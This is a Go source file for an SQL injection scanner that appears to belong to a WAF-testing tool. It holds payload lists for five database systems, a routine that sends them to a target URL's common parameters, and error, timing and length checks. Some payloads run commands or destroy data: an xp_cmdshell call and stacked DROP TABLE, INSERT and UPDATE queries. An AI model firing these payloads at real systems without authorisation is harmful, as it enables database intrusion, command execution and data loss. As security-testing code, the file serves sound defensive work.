// Package sqli provides SQL injection detection capabilities for security testing.
// It supports multiple detection techniques including error-based, time-based blind,
// union-based, boolean-based blind, and stacked queries across multiple DBMS platforms.
package sqli

import (
	"context"
	"fmt"
	"net/http"
	"net/url"
	"regexp"
	"strings"
	"time"

	"github.com/waftester/waftester/pkg/defaults"
	"github.com/waftester/waftester/pkg/duration"
	"github.com/waftester/waftester/pkg/httpclient"
	"github.com/waftester/waftester/pkg/iohelper"
	"github.com/waftester/waftester/pkg/regexcache"
	"github.com/waftester/waftester/pkg/ui"
)

// DBMS represents a database management system
type DBMS string

const (
	DBMSMySQL      DBMS = "mysql"
	DBMSPostgreSQL DBMS = "postgresql"
	DBMSMSSQL      DBMS = "mssql"
	DBMSOracle     DBMS = "oracle"
	DBMSSQLite     DBMS = "sqlite"
	DBMSGeneric    DBMS = "generic"
)

// InjectionType represents the type of SQL injection technique
type InjectionType string

const (
	InjectionErrorBased   InjectionType = "error-based"
	InjectionTimeBased    InjectionType = "time-based"
	InjectionUnionBased   InjectionType = "union-based"
	InjectionBooleanBased InjectionType = "boolean-based"
	InjectionStacked      InjectionType = "stacked"
)

// Severity levels for vulnerabilities
type Severity string

const (
	SeverityCritical Severity = "critical"
	SeverityHigh     Severity = "high"
	SeverityMedium   Severity = "medium"
	SeverityLow      Severity = "low"
)

// Payload represents an SQL injection payload
type Payload struct {
	Value       string
	Type        InjectionType
	DBMS        DBMS
	Description string
	SleepTime   time.Duration // For time-based
}

// Vulnerability represents a detected SQL injection vulnerability
type Vulnerability struct {
	Type         InjectionType
	DBMS         DBMS
	Description  string
	Severity     Severity
	URL          string
	Parameter    string
	Method       string
	Payload      *Payload
	Evidence     string
	Remediation  string
	ResponseTime time.Duration
	CVSS         float64
	ConfirmedBy  int
}

// ScanResult represents the result of a scan
type ScanResult struct {
	URL             string
	TestedParams    int
	Vulnerabilities []Vulnerability
	StartTime       time.Time
	Duration        time.Duration
}

// TesterConfig holds configuration for the SQL injection tester
type TesterConfig struct {
	Timeout       time.Duration
	DBMS          DBMS
	TimeThreshold time.Duration
	UserAgent     string
	Client        *http.Client
	MaxPayloads   int // Maximum payloads per parameter (0 = unlimited)
	MaxParams     int // Maximum parameters to test (0 = unlimited)
}

// Tester provides SQL injection testing capabilities
type Tester struct {
	config   *TesterConfig
	payloads []Payload
	client   *http.Client
}

// DefaultConfig returns a default configuration
func DefaultConfig() *TesterConfig {
	return &TesterConfig{
		Timeout:       duration.HTTPFuzzing,
		DBMS:          DBMSGeneric,
		TimeThreshold: duration.CMDIThreshold,
		UserAgent:     ui.UserAgent(),
	}
}

// NewTester creates a new SQL injection tester
func NewTester(config *TesterConfig) *Tester {
	if config == nil {
		config = DefaultConfig()
	}

	client := config.Client
	if client == nil {
		client = httpclient.Default()
	}

	t := &Tester{
		config: config,
		client: client,
	}

	t.payloads = t.generatePayloads()
	return t
}

// generatePayloads generates SQL injection payloads for all DBMS types
func (t *Tester) generatePayloads() []Payload {
	var payloads []Payload

	// Generic error-based payloads
	errorPayloads := []struct {
		value string
		desc  string
	}{
		{"'", "Single quote injection"},
		{"\"", "Double quote injection"},
		{"' OR '1'='1", "Classic OR injection"},
		{"\" OR \"1\"=\"1", "Double quote OR injection"},
		{"1' OR '1'='1' --", "OR with comment"},
		{"1' OR '1'='1' #", "OR with hash comment"},
		{"1' AND '1'='1", "AND injection"},
		{"1' AND '1'='2", "AND false injection"},
		{"' OR ''='", "Empty string comparison"},
		{"' OR 1=1--", "Numeric comparison"},
		{"') OR ('1'='1", "Parenthesis escape"},
		{"')) OR (('1'='1", "Double parenthesis escape"},
		{"1' ORDER BY 1--", "ORDER BY probe"},
		{"1' ORDER BY 10--", "ORDER BY high probe"},
		{"' UNION SELECT NULL--", "Union NULL probe"},
	}

	for _, p := range errorPayloads {
		payloads = append(payloads, Payload{
			Value:       p.value,
			Type:        InjectionErrorBased,
			DBMS:        DBMSGeneric,
			Description: p.desc,
		})
	}

	// MySQL specific payloads
	mysqlPayloads := []struct {
		value string
		desc  string
	}{
		{"' AND EXTRACTVALUE(1,CONCAT(0x7e,VERSION()))--", "MySQL error extraction"},
		{"' AND UPDATEXML(1,CONCAT(0x7e,VERSION()),1)--", "MySQL UPDATEXML error"},
		{"' AND (SELECT * FROM (SELECT COUNT(*),CONCAT(VERSION(),FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.TABLES GROUP BY x)a)--", "MySQL group by error"},
		{"' UNION SELECT @@version,NULL,NULL--", "MySQL version union"},
		{"'; SELECT SLEEP(5)--", "MySQL stacked sleep"},
		{"' AND IF(1=1,SLEEP(5),0)--", "MySQL conditional sleep"},
		{"' AND BENCHMARK(5000000,MD5('test'))--", "MySQL benchmark delay"},
	}

	for _, p := range mysqlPayloads {
		payloads = append(payloads, Payload{
			Value:       p.value,
			Type:        InjectionErrorBased,
			DBMS:        DBMSMySQL,
			Description: p.desc,
		})
	}

	// PostgreSQL specific payloads
	postgresPayloads := []struct {
		value string
		desc  string
	}{
		{"' AND CAST((SELECT version()) AS int)--", "PostgreSQL version cast error"},
		{"';SELECT pg_sleep(5)--", "PostgreSQL stacked sleep"},
		{"' AND (SELECT pg_sleep(5))--", "PostgreSQL subquery sleep"},
		{"' UNION SELECT version(),NULL,NULL--", "PostgreSQL version union"},
		{"' AND 1=CAST((SELECT current_user) AS int)--", "PostgreSQL user extraction"},
	}

	for _, p := range postgresPayloads {
		payloads = append(payloads, Payload{
			Value:       p.value,
			Type:        InjectionErrorBased,
			DBMS:        DBMSPostgreSQL,
			Description: p.desc,
		})
	}

	// MSSQL specific payloads
	mssqlPayloads := []struct {
		value string
		desc  string
	}{
		{"' AND 1=CONVERT(int,(SELECT @@version))--", "MSSQL version convert error"},
		{"';WAITFOR DELAY '0:0:5'--", "MSSQL stacked waitfor"},
		{"' AND IF 1=1 WAITFOR DELAY '0:0:5'--", "MSSQL conditional waitfor"},
		{"' UNION SELECT @@version,NULL,NULL--", "MSSQL version union"},
		{"'; EXEC xp_cmdshell('whoami')--", "MSSQL xp_cmdshell"},
	}

	for _, p := range mssqlPayloads {
		payloads = append(payloads, Payload{
			Value:       p.value,
			Type:        InjectionErrorBased,
			DBMS:        DBMSMSSQL,
			Description: p.desc,
		})
	}

	// Oracle specific payloads
	oraclePayloads := []struct {
		value string
		desc  string
	}{
		{"' AND CTXSYS.DRITHSX.SN(user,(SELECT banner FROM v$version WHERE ROWNUM=1))=1--", "Oracle context error"},
		{"' AND UTL_INADDR.GET_HOST_ADDRESS((SELECT banner FROM v$version WHERE ROWNUM=1))--", "Oracle UTL_INADDR error"},
		{"' AND DBMS_PIPE.RECEIVE_MESSAGE('a',5)=1--", "Oracle pipe delay"},
		{"' UNION SELECT banner,NULL,NULL FROM v$version--", "Oracle version union"},
	}

	for _, p := range oraclePayloads {
		payloads = append(payloads, Payload{
			Value:       p.value,
			Type:        InjectionErrorBased,
			DBMS:        DBMSOracle,
			Description: p.desc,
		})
	}

	// SQLite specific payloads
	sqlitePayloads := []struct {
		value string
		desc  string
	}{
		{"' AND SQLITE_VERSION()--", "SQLite version check"},
		{"' UNION SELECT sqlite_version(),NULL,NULL--", "SQLite version union"},
		{"' AND 1=CAST(SQLITE_VERSION() AS int)--", "SQLite cast error"},
	}

	for _, p := range sqlitePayloads {
		payloads = append(payloads, Payload{
			Value:       p.value,
			Type:        InjectionErrorBased,
			DBMS:        DBMSSQLite,
			Description: p.desc,
		})
	}

	// Time-based blind payloads
	timePayloads := []struct {
		value     string
		dbms      DBMS
		sleepTime time.Duration
		desc      string
	}{
		{"' AND SLEEP(5)--", DBMSMySQL, 5 * time.Second, "MySQL SLEEP"},
		{"' OR SLEEP(5)--", DBMSMySQL, 5 * time.Second, "MySQL OR SLEEP"},
		{"' AND IF(1=1,SLEEP(5),0)--", DBMSMySQL, 5 * time.Second, "MySQL conditional SLEEP"},
		{"' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--", DBMSMySQL, 5 * time.Second, "MySQL subquery SLEEP"},
		{"'; SELECT pg_sleep(5)--", DBMSPostgreSQL, 5 * time.Second, "PostgreSQL pg_sleep"},
		{"' AND pg_sleep(5)--", DBMSPostgreSQL, 5 * time.Second, "PostgreSQL AND pg_sleep"},
		{"' || pg_sleep(5)--", DBMSPostgreSQL, 5 * time.Second, "PostgreSQL concat pg_sleep"},
		{"';WAITFOR DELAY '0:0:5'--", DBMSMSSQL, 5 * time.Second, "MSSQL WAITFOR DELAY"},
		{"' WAITFOR DELAY '0:0:5'--", DBMSMSSQL, 5 * time.Second, "MSSQL WAITFOR"},
		{"' AND 1=DBMS_PIPE.RECEIVE_MESSAGE('a',5)--", DBMSOracle, 5 * time.Second, "Oracle RECEIVE_MESSAGE"},
	}

	for _, p := range timePayloads {
		payloads = append(payloads, Payload{
			Value:       p.value,
			Type:        InjectionTimeBased,
			DBMS:        p.dbms,
			SleepTime:   p.sleepTime,
			Description: p.desc,
		})
	}

	// Boolean-based blind payloads
	booleanPayloads := []struct {
		value string
		desc  string
	}{
		{"' AND 1=1--", "Boolean true"},
		{"' AND 1=2--", "Boolean false"},
		{"' AND 'a'='a'--", "String comparison true"},
		{"' AND 'a'='b'--", "String comparison false"},
		{"' AND (SELECT COUNT(*) FROM information_schema.tables)>0--", "Information schema probe"},
		{"' AND SUBSTRING('test',1,1)='t'--", "Substring true"},
		{"' AND SUBSTRING('test',1,1)='x'--", "Substring false"},
		{"' AND LENGTH('test')=4--", "Length true"},
		{"' AND LENGTH('test')=5--", "Length false"},
		{"' AND ASCII(SUBSTRING('test',1,1))=116--", "ASCII value true"},
		{"' AND ASCII(SUBSTRING('test',1,1))=115--", "ASCII value false"},
	}

	for _, p := range booleanPayloads {
		payloads = append(payloads, Payload{
			Value:       p.value,
			Type:        InjectionBooleanBased,
			DBMS:        DBMSGeneric,
			Description: p.desc,
		})
	}

	// Union-based payloads
	unionPayloads := []struct {
		value string
		desc  string
	}{
		{"' UNION SELECT NULL--", "Union 1 column"},
		{"' UNION SELECT NULL,NULL--", "Union 2 columns"},
		{"' UNION SELECT NULL,NULL,NULL--", "Union 3 columns"},
		{"' UNION SELECT NULL,NULL,NULL,NULL--", "Union 4 columns"},
		{"' UNION SELECT NULL,NULL,NULL,NULL,NULL--", "Union 5 columns"},
		{"' UNION ALL SELECT NULL--", "Union ALL 1 column"},
		{"' UNION ALL SELECT NULL,NULL,NULL--", "Union ALL 3 columns"},
		{"0 UNION SELECT NULL--", "Numeric union 1 column"},
		{"0 UNION SELECT NULL,NULL,NULL--", "Numeric union 3 columns"},
	}

	for _, p := range unionPayloads {
		payloads = append(payloads, Payload{
			Value:       p.value,
			Type:        InjectionUnionBased,
			DBMS:        DBMSGeneric,
			Description: p.desc,
		})
	}

	// Stacked query payloads
	stackedPayloads := []struct {
		value string
		dbms  DBMS
		desc  string
	}{
		{"'; SELECT 1--", DBMSGeneric, "Generic stacked query"},
		{"'; DROP TABLE test--", DBMSGeneric, "Stacked DROP (test)"},
		{"'; INSERT INTO test VALUES(1)--", DBMSGeneric, "Stacked INSERT"},
		{"'; UPDATE test SET x=1--", DBMSGeneric, "Stacked UPDATE"},
		{"';SELECT @@version--", DBMSMSSQL, "MSSQL stacked version"},
		{"';SELECT version()--", DBMSPostgreSQL, "PostgreSQL stacked version"},
	}

	for _, p := range stackedPayloads {
		payloads = append(payloads, Payload{
			Value:       p.value,
			Type:        InjectionStacked,
			DBMS:        p.dbms,
			Description: p.desc,
		})
	}

	// Filter by DBMS if specified
	if t.config.DBMS != DBMSGeneric {
		var filtered []Payload
		for _, p := range payloads {
			if p.DBMS == t.config.DBMS || p.DBMS == DBMSGeneric {
				filtered = append(filtered, p)
			}
		}
		return filtered
	}

	return payloads
}

// GetPayloads returns payloads filtered by type
func (t *Tester) GetPayloads(injectionType InjectionType) []Payload {
	if injectionType == "" {
		return t.payloads
	}

	var filtered []Payload
	for _, p := range t.payloads {
		if p.Type == injectionType {
			filtered = append(filtered, p)
		}
	}
	return filtered
}

// SQL error patterns for different DBMS
var errorPatterns = map[DBMS][]*regexp.Regexp{
	DBMSMySQL: {
		regexcache.MustGet(`(?i)SQL syntax.*MySQL`),
		regexcache.MustGet(`(?i)Warning.*mysql_`),
		regexcache.MustGet(`(?i)valid MySQL result`),
		regexcache.MustGet(`(?i)MySqlClient\.`),
		regexcache.MustGet(`(?i)com\.mysql\.jdbc`),
		regexcache.MustGet(`(?i)Syntax error.*MySQL`),
		regexcache.MustGet(`(?i)mysqli_`),
		regexcache.MustGet(`(?i)mysql_fetch_`),
		regexcache.MustGet(`(?i)You have an error in your SQL syntax`),
	},
	DBMSPostgreSQL: {
		regexcache.MustGet(`(?i)PostgreSQL.*ERROR`),
		regexcache.MustGet(`(?i)Warning.*\Wpg_`),
		regexcache.MustGet(`(?i)valid PostgreSQL result`),
		regexcache.MustGet(`(?i)Npgsql\.`),
		regexcache.MustGet(`(?i)PG::SyntaxError`),
		regexcache.MustGet(`(?i)org\.postgresql\.util\.PSQLException`),
		regexcache.MustGet(`(?i)ERROR:\s*syntax error at or near`),
	},
	DBMSMSSQL: {
		regexcache.MustGet(`(?i)Driver.*SQL[\-\_\ ]*Server`),
		regexcache.MustGet(`(?i)OLE DB.*SQL Server`),
		regexcache.MustGet(`(?i)\bSQL Server\b.*\bDriver`),
		regexcache.MustGet(`(?i)Warning.*mssql_`),
		regexcache.MustGet(`(?i)\bSQL Server\b.*\b\d+`),
		regexcache.MustGet(`(?i)Microsoft SQL Native Client error`),
		regexcache.MustGet(`(?i)Msg \d+, Level \d+, State \d+`),
		regexcache.MustGet(`(?i)Unclosed quotation mark after`),
		regexcache.MustGet(`(?i)ODBC SQL Server Driver`),
	},
	DBMSOracle: {
		regexcache.MustGet(`(?i)\bORA-[0-9]{4,}`),
		regexcache.MustGet(`(?i)Oracle error`),
		regexcache.MustGet(`(?i)Oracle.*Driver`),
		regexcache.MustGet(`(?i)Warning.*oci_`),
		regexcache.MustGet(`(?i)Warning.*ora_`),
		regexcache.MustGet(`(?i)quoted string not properly terminated`),
	},
	DBMSSQLite: {
		regexcache.MustGet(`(?i)SQLite.*error`),
		regexcache.MustGet(`(?i)Warning.*sqlite_`),
		regexcache.MustGet(`(?i)Warning.*SQLite3::`),
		regexcache.MustGet(`(?i)SQLite3::query`),
		regexcache.MustGet(`(?i)\[SQLITE_ERROR\]`),
		regexcache.MustGet(`(?i)SQLITE_CONSTRAINT`),
	},
	DBMSGeneric: {
		regexcache.MustGet(`(?i)SQL error`),
		regexcache.MustGet(`(?i)SQL syntax`),
		regexcache.MustGet(`(?i)syntax error`),
		regexcache.MustGet(`(?i)ODBCException`),
		regexcache.MustGet(`(?i)javax\.persistence\.PersistenceException`),
		regexcache.MustGet(`(?i)Hibernate.*Query`),
		regexcache.MustGet(`(?i)java\.sql\.SQLException`),
		regexcache.MustGet(`(?i)Unexpected end of command`),
		regexcache.MustGet(`(?i)Incorrect syntax near`),
		regexcache.MustGet(`(?i)quoted identifier`),
	},
}

// detectDBMS detects the DBMS from error messages
func detectDBMS(body string) DBMS {
	for dbms, patterns := range errorPatterns {
		if dbms == DBMSGeneric {
			continue
		}
		for _, pattern := range patterns {
			if pattern.MatchString(body) {
				return dbms
			}
		}
	}
	return DBMSGeneric
}

// containsError checks if the body contains SQL error messages.
// Uses a quick-check first to avoid expensive regex matching on non-vulnerable responses.
func containsError(body string) (bool, string) {
	// Quick rejection: if body doesn't contain any SQL-related keywords,
	// skip the expensive regex matching. This filters ~80% of responses.
	lowerBody := strings.ToLower(body)
	if !containsSQLKeyword(lowerBody) {
		return false, ""
	}

	for _, patterns := range errorPatterns {
		for _, pattern := range patterns {
			if loc := pattern.FindStringIndex(body); loc != nil {
				// Extract context around the match
				start := loc[0] - 50
				if start < 0 {
					start = 0
				}
				end := loc[1] + 50
				if end > len(body) {
					end = len(body)
				}
				return true, body[start:end]
			}
		}
	}
	return false, ""
}

// containsSQLKeyword performs a fast check for common SQL error keywords.
// This is much faster than running ~50 regex patterns.
func containsSQLKeyword(lowerBody string) bool {
	// Check for common SQL error indicators
	keywords := []string{
		"sql", "syntax", "error", "warning", "mysql", "postgresql",
		"oracle", "sqlite", "mssql", "odbc", "jdbc", "hibernate",
		"ora-", "pg::", "unclosed", "quotation", "query",
	}
	for _, kw := range keywords {
		if strings.Contains(lowerBody, kw) {
			return true
		}
	}
	return false
}

// TestParameter tests a single parameter for SQL injection
func (t *Tester) TestParameter(ctx context.Context, targetURL, param, method string) ([]Vulnerability, error) {
	var vulns []Vulnerability

	// Get baseline response time
	baselineStart := time.Now()
	baseResp, err := t.sendRequest(ctx, targetURL, param, "test", method)
	if err != nil {
		return nil, err
	}
	baselineTime := time.Since(baselineStart)
	baseBody, _ := iohelper.ReadBodyDefault(baseResp.Body)
	iohelper.DrainAndClose(baseResp.Body)
	baseLen := len(baseBody)

	for i, payload := range t.payloads {
		// MaxPayloads limit: skip remaining payloads once threshold reached
		if t.config.MaxPayloads > 0 && i >= t.config.MaxPayloads {
			break
		}

		select {
		case <-ctx.Done():
			return vulns, ctx.Err()
		default:
		}

		start := time.Now()
		resp, err := t.sendRequest(ctx, targetURL, param, payload.Value, method)
		if err != nil {
			continue
		}

		responseTime := time.Since(start)
		body, _ := iohelper.ReadBodyDefault(resp.Body)
		iohelper.DrainAndClose(resp.Body)

		// Error-based detection
		if hasError, evidence := containsError(string(body)); hasError {
			detectedDBMS := detectDBMS(string(body))
			vulns = append(vulns, Vulnerability{
				Type:         InjectionErrorBased,
				DBMS:         detectedDBMS,
				Description:  fmt.Sprintf("SQL injection via %s", payload.Description),
				Severity:     SeverityCritical,
				URL:          targetURL,
				Parameter:    param,
				Method:       method,
				Payload:      &payload,
				Evidence:     evidence,
				ResponseTime: responseTime,
				Remediation:  GetRemediation(),
				CVSS:         9.8,
			})
			continue
		}

		// Time-based detection
		if payload.Type == InjectionTimeBased {
			expectedDelay := payload.SleepTime
			if expectedDelay == 0 {
				expectedDelay = 5 * time.Second
			}

			// Check if response took significantly longer than baseline
			if responseTime > baselineTime+expectedDelay-time.Second {
				vulns = append(vulns, Vulnerability{
					Type:         InjectionTimeBased,
					DBMS:         payload.DBMS,
					Description:  fmt.Sprintf("Time-based blind SQL injection via %s", payload.Description),
					Severity:     SeverityCritical,
					URL:          targetURL,
					Parameter:    param,
					Method:       method,
					Payload:      &payload,
					ResponseTime: responseTime,
					Evidence:     fmt.Sprintf("Response delayed by %v (baseline: %v)", responseTime, baselineTime),
					Remediation:  GetRemediation(),
					CVSS:         9.8,
				})
			}
			continue
		}

		// Boolean-based detection (compare content length)
		if payload.Type == InjectionBooleanBased {
			lenDiff := len(body) - baseLen
			if lenDiff < 0 {
				lenDiff = -lenDiff
			}

			// Significant length difference might indicate boolean-based
			if lenDiff > 100 && strings.Contains(payload.Description, "true") {
				vulns = append(vulns, Vulnerability{
					Type:        InjectionBooleanBased,
					DBMS:        DBMSGeneric,
					Description: fmt.Sprintf("Boolean-based blind SQL injection (length diff: %d)", lenDiff),
					Severity:    SeverityHigh,
					URL:         targetURL,
					Parameter:   param,
					Method:      method,
					Payload:     &payload,
					Evidence:    fmt.Sprintf("Baseline length: %d, Current length: %d", baseLen, len(body)),
					Remediation: GetRemediation(),
					CVSS:        8.6,
				})
			}
		}
	}

	return vulns, nil
}

// sendRequest sends an HTTP request with the payload
func (t *Tester) sendRequest(ctx context.Context, targetURL, param, value, method string) (*http.Response, error) {
	parsedURL, err := url.Parse(targetURL)
	if err != nil {
		return nil, err
	}

	var req *http.Request

	if method == "POST" {
		form := url.Values{}
		form.Set(param, value)
		req, err = http.NewRequestWithContext(ctx, "POST", targetURL, strings.NewReader(form.Encode()))
		if err != nil {
			return nil, err
		}
		req.Header.Set("Content-Type", defaults.ContentTypeForm)
	} else {
		q := parsedURL.Query()
		q.Set(param, value)
		parsedURL.RawQuery = q.Encode()
		req, err = http.NewRequestWithContext(ctx, "GET", parsedURL.String(), nil)
		if err != nil {
			return nil, err
		}
	}

	req.Header.Set("User-Agent", t.config.UserAgent)

	return t.client.Do(req)
}

// Scan performs a full SQL injection scan on a URL
func (t *Tester) Scan(ctx context.Context, targetURL string) (*ScanResult, error) {
	startTime := time.Now()
	result := &ScanResult{
		URL:       targetURL,
		StartTime: startTime,
	}

	params := CommonSQLiParams()

	// MaxParams limit: test only a subset of parameters
	if t.config.MaxParams > 0 && len(params) > t.config.MaxParams {
		params = params[:t.config.MaxParams]
	}

	for _, param := range params {
		select {
		case <-ctx.Done():
			result.Duration = time.Since(startTime)
			return result, ctx.Err()
		default:
		}

		vulns, err := t.TestParameter(ctx, targetURL, param, "GET")
		if err != nil {
			continue
		}

		result.TestedParams++
		result.Vulnerabilities = append(result.Vulnerabilities, vulns...)
	}

	result.Duration = time.Since(startTime)
	return result, nil
}

// CommonSQLiParams returns commonly vulnerable parameter names
func CommonSQLiParams() []string {
	return []string{
		"id", "ID", "Id",
		"user", "username", "login",
		"name", "email",
		"search", "q", "query",
		"page", "p", "num",
		"cat", "category", "catid",
		"sort", "order", "orderby",
		"dir", "type", "view",
		"year", "month", "date",
		"article", "item", "product",
		"file", "doc", "document",
		"action", "do", "cmd",
		"show", "display", "get",
		"news", "blog", "post",
		"pid", "uid", "sid",
		"limit", "offset", "start",
		"filter", "where", "column",
	}
}

// AllInjectionTypes returns all SQL injection types
func AllInjectionTypes() []InjectionType {
	return []InjectionType{
		InjectionErrorBased,
		InjectionTimeBased,
		InjectionUnionBased,
		InjectionBooleanBased,
		InjectionStacked,
	}
}

// AllDBMS returns all supported DBMS types
func AllDBMS() []DBMS {
	return []DBMS{
		DBMSMySQL,
		DBMSPostgreSQL,
		DBMSMSSQL,
		DBMSOracle,
		DBMSSQLite,
		DBMSGeneric,
	}
}

// GetRemediation returns remediation guidance for SQL injection
func GetRemediation() string {
	return `1. Use parameterized queries (prepared statements) for all database operations
2. Implement input validation with whitelisting
3. Apply the principle of least privilege to database accounts
4. Use stored procedures with parameterized inputs
5. Escape special characters if parameterization is not possible
6. Implement Web Application Firewall (WAF) rules
7. Keep database software updated
8. Use ORM frameworks that handle parameterization automatically
9. Implement proper error handling to prevent information disclosure
10. Regular security testing and code review`
}

// IsSQLEndpoint checks if a URL likely handles SQL data
func IsSQLEndpoint(urlStr string) bool {
	indicators := []string{
		"/search", "/query", "/find",
		"/lookup", "/user", "/profile",
		"/product", "/item", "/article",
		"/news", "/blog", "/post",
		"/category", "/cat", "/page",
		"/list", "/view", "/show",
		"/get", "/fetch", "/load",
		"/report", "/export", "/data",
		"id=", "user=", "search=",
	}

	lower := strings.ToLower(urlStr)
	for _, indicator := range indicators {
		if strings.Contains(lower, indicator) {
			return true
		}
	}
	return false
}

// GetDBMSPayloads returns payloads specific to a DBMS
func (t *Tester) GetDBMSPayloads(dbms DBMS) []Payload {
	var filtered []Payload
	for _, p := range t.payloads {
		if p.DBMS == dbms || p.DBMS == DBMSGeneric {
			filtered = append(filtered, p)
		}
	}
	return filtered
}

// GenerateUnionPayloads generates UNION-based payloads for column enumeration
func GenerateUnionPayloads(maxColumns int) []string {
	var payloads []string

	for i := 1; i <= maxColumns; i++ {
		nulls := make([]string, i)
		for j := 0; j < i; j++ {
			nulls[j] = "NULL"
		}
		nullStr := strings.Join(nulls, ",")

		payloads = append(payloads, fmt.Sprintf("' UNION SELECT %s--", nullStr))
		payloads = append(payloads, fmt.Sprintf("' UNION ALL SELECT %s--", nullStr))
		payloads = append(payloads, fmt.Sprintf("0 UNION SELECT %s--", nullStr))
	}

	return payloads
}

// GenerateTimePayloads generates time-based payloads with custom delay
func GenerateTimePayloads(delaySeconds int) []Payload {
	return []Payload{
		{Value: fmt.Sprintf("' AND SLEEP(%d)--", delaySeconds), Type: InjectionTimeBased, DBMS: DBMSMySQL, SleepTime: time.Duration(delaySeconds) * time.Second},
		{Value: fmt.Sprintf("' AND (SELECT SLEEP(%d))--", delaySeconds), Type: InjectionTimeBased, DBMS: DBMSMySQL, SleepTime: time.Duration(delaySeconds) * time.Second},
		{Value: fmt.Sprintf("'; SELECT pg_sleep(%d)--", delaySeconds), Type: InjectionTimeBased, DBMS: DBMSPostgreSQL, SleepTime: time.Duration(delaySeconds) * time.Second},
		{Value: fmt.Sprintf("';WAITFOR DELAY '0:0:%d'--", delaySeconds), Type: InjectionTimeBased, DBMS: DBMSMSSQL, SleepTime: time.Duration(delaySeconds) * time.Second},
		{Value: fmt.Sprintf("' AND DBMS_PIPE.RECEIVE_MESSAGE('a',%d)=1--", delaySeconds), Type: InjectionTimeBased, DBMS: DBMSOracle, SleepTime: time.Duration(delaySeconds) * time.Second},
	}
}
